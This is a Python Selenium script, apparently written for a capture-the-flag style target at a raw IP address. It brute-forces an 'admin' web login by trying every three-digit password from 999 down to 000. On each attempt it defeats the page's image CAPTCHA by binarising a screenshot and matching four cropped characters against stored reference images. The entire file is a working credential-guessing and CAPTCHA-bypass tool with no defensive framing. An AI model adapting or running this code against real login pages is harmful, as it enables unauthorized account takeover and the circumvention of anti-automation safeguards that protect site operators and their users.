#coding=utf-8
from selenium import webdriver
from PIL import Image,ImageChops
import sys,io
import numpy as np
lst1 = [10,19,28,37]
lst2 = [19,28,37,46]
alpha = '0123456789abcdfghijk'
def get_one_code(frame):
    frame = np.array(frame)
    for x in alpha:
        tmp = Image.open('ans_%c.png'%(x))
        tmp = np.array(tmp)
        if (frame == tmp). all():
            return x
    return '?'
def get_four_code(authcode):
    code = ''
    for j in range(4):
        left = lst1[j]
        top = 0
        right = lst2[j]
        bottom = 28
        frame = authcode.crop((left, top, right, bottom))         
        code += get_one_code(frame)
    return code

driver = webdriver.PhantomJS()
driver.maximize_window()  # 将浏览器最大化
threshold = 200
table = []
for i in range(256):
    if i > threshold:
        table.append(1)
    else:
        table.append(0)
for i in range(1000,0,-1):
    if i%25==0:
        print ('------%d'%(i))
    pwd = '%03d'%(i)    
    driver.get('http://39.100.83.188:8002/#')
    driver.save_screenshot("screen.bmp")
    img = driver.find_elements_by_tag_name('img')
    x = img[0]
    imgWidth = x.size['width']
    imgHeight = x.size['height']
    imgX = int(x.location_once_scrolled_into_view['x'])
    imgY = int(x.location_once_scrolled_into_view['y'])
    left = imgX
    top = imgY
    right = imgX + imgWidth
    bottom = imgY + imgHeight
    imgFrame = Image.open('screen.bmp')
    imgry = imgFrame.convert('L')
    imgFrame = imgry.point(table, '1')
    imgFrame = imgFrame.crop((left, top, right, bottom))  # 裁剪
    imgFrame.save('test.bmp')
    imgFrame = Image.open('test.bmp')
    code = get_four_code(imgFrame)
    elem=driver.find_element_by_name("username")
    elem.send_keys('admin')
    elem=driver.find_element_by_name("pwd")
    elem.send_keys(pwd)
    elem=driver.find_element_by_name("user_code")
    elem.send_keys(code)
    elem=driver.find_element_by_name("Login")
    elem.click()
    d = driver.page_source
    # if len(d) == 56:
    #     continue
    # else:
    #     print ('maybe %d'%(i))
    print driver.page_source.encode('GBK','ignore')
    # driver.save_screenshot("login_%d.bmp"%(i))

driver.quit()
